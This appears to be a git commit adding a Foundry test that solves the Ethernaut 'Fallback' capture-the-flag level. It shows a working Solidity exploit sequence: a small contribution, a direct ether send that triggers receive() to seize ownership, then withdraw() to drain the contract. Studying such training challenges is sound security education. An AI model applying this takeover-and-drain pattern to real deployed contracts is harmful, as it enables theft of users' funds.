0b8dbe9ddaaf6d2289c535b907f4c56ea9c32029
puffdood <puffdood@gmail.com>
2022-10-03 20:54:54 +1100

    Solve 01-Fallback challenge
    Solve 01-Fallback challenge

---
+++ src/test/Fallback.t.sol
@@ -0,0 +1,57 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+import "../levels/01-FallbackFactory.sol";
+import "../core/Ethernaut.sol";
+
+contract FallbackTest is Test {
+    Ethernaut ethernaut;
+    address attacker = address(1337);
+
+    function setUp() public {
+        ethernaut = new Ethernaut();
+        vm.deal(attacker, 2 wei);
+    }
+
+    function testFallbackHack() public {
+        /////////////////
+        // LEVEL SETUP //
+        /////////////////
+
+        FallbackFactory fallbackFactory = new FallbackFactory();
+        ethernaut.registerLevel(fallbackFactory);
+        vm.startPrank(attacker);
+        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
+        Fallback fallbackContract = Fallback(payable(levelAddress));
+
+        //////////////////
+        // LEVEL ATTACK //
+        //////////////////
+        // 1. contribute in order to pass require checks
+        // 2. trigger receive() to change ownership
+        // 3. withdraw() to drain the contract
+        fallbackContract.contribute{value: 1 wei}();
+        assertEq(fallbackContract.getContribution(), 1 wei);
+
+        (bool success, ) = payable(address(fallbackContract)).call{
+            value: 1 wei
+        }("");
+        assertTrue(success);
+        assertEq(fallbackContract.owner(), attacker);
+
+        uint256 contractBalance = address(fallbackContract).balance;
+        fallbackContract.withdraw();
+        assertEq(address(fallbackContract).balance, 0);
+        assertEq(attacker.balance, contractBalance);
+
+        //////////////////////
+        // LEVEL SUBMISSION //
+        //////////////////////
+        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(
+            payable(levelAddress)
+        );
+        vm.stopPrank();
+        assert(isLevelSuccessfullyPassed);
+    }
+}
